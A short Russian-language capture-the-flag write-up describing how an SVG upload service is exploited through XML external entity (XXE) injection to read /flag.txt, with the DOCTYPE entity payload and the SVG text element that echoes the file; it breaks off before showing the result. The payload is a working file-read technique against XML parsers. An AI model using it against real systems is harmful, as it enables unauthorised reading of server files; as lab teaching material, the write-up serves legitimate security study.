**Задание:**

Флаг находится в корне сервера в файле /flag.txt.

Адрес: http://31.207.77.216:4017

---
**Решение:**

В сервисе есть загрузка SVG-картинок, которые являются XML-документы → потенциальная уязвимость XXE. 

Выберем какую-нибудь картинку, перехватим запрос и добавим payload для получения флага.

Вначале запроса объявляем XML-сущность, которая ссылается на файл с флагом:

```text
<?xml version="1.0"?>
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "file:///flag.txt">
]>
```

Где-нибудь в теле изображения добавим ссылку на нашу сущность (например в конце):

```text
<text x="50" y="50" font-size="20" fill="red">&xxe;</text>
</svg>
```

Когда XML-парсер обрабатывает документ, он заменяет `&xxe;` на содержимое файла `/flag.txt` и мы получаем флаг:
